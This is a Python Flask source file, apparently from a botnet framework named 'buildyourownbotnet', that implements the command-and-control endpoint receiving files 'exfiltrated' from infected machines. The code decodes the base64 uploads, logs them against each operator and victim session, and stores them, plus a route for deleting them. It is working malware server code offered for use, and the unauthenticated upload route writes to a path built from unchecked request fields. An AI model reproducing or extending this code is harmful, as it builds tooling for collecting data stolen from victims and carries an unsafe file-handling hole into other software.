import os
import base64
from flask import Blueprint, request, flash, url_for, redirect
from flask_login import login_required

from buildyourownbotnet.core import generators
from buildyourownbotnet.core.dao import file_dao

# Blueprint
files = Blueprint('files', __name__)


@files.route("/api/file/add", methods=["POST"])
def file_add():
    """Upload new exfilrated file."""
    total = request.get_json()
    b64_data = total['data']
    try:
        filetype = total['type']
    except KeyError:
        filetype = ""
    owner = total['owner']
    module = total['module']
    session = total['session']
    try:
        filename = total['filename']
    except KeyError:
        filename = ""
    # decode any base64 values

    try:
        data = base64.b64decode(b64_data)
    except:
        if b64_data.startswith('_b64'):
            data = base64.b64decode(b64_data[6:]).decode('ascii')
        else:
            print('/api/file/add error: invalid data ' + str(b64_data))
            return
    try:
        session = base64.b64decode(session)
    except:
        try:
            if session.startswith('_b64'):
                session = base64.b64decode(session[6:]).decode('ascii')
        except:
            pass

    # add . to file extension if necessary
    if not filetype:
        filetype = '.dat'
    elif not filetype.startswith('.'):
        filetype = '.' + filetype

    # generate random filename if not specified
    if not filename:
        filename = generators.variable(length=3) + filetype

    output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)

    # add exfiltrated file to database
    file_dao.add_user_file(owner, filename, session, module)

    # save exfiltrated file to user directory
    with open(output_path, 'wb') as fp:
        fp.write(data)

    return filename


@files.route("/api/file/delete", methods=["POST", "GET"])
@login_required
def file_delete():
    """Delete the chosen file"""
    username = request.args.get('username')
    filename = request.args.get('filename')
    file_dao.rm_user_file(username, filename)
    flash('Successfully deleted file: ' + filename, 'success')
    return redirect(url_for('main.files'))
